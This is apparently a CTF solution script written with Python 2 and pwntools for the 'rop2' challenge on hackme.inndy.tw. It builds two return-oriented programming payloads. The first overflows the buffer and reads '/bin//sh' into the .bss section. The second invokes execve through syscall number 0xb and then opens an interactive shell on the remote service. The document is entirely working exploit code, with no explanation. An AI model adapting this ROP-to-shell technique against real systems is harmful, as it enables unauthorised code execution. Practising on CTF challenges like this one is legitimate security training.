#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
import time
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

def debug(addr = '0x8048485'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)


elf = ELF('/home/h11p/hackme/rop2')
bss_addr = elf.bss()
print "%x" % bss_addr

shellcode='/bin//sh'
#shellcode=p32(0x0804847C)
elf = ELF('/home/h11p/hackme/rop2')
offset = 16

#io = process('/home/h11p/hackme/rop2')

io = remote('hackme.inndy.tw', 7703)

payload = 'a'*4 +'b'*4+'c'*4
payload += p32(0x080484FF)
payload += p32(0x080484FF)
#payload += p32(0x0804B054)
payload += p32(0x3)
payload += p32(0x0)
payload += p32(bss_addr)  #.bss
payload += p32(0x8)


payload2 = 'a'*4 +'b'*4+'c'*4
payload2 += p32(0x080484FF)
payload2 += p32(0x080484FF)
#payload += p32(0x0804B054)
payload2 += p32(0xb)
payload2 += p32(bss_addr)  #.bss
payload2 += p32(0x0)
payload2 += p32(0x0)

#debug()
io.recvuntil('Can you solve this?\nGive me your ropchain:')
io.sendline(payload)
io.readline()
io.send(shellcode)
io.recvline(timeout=3)
io.sendline(payload2)

io.interactive()

io.close()

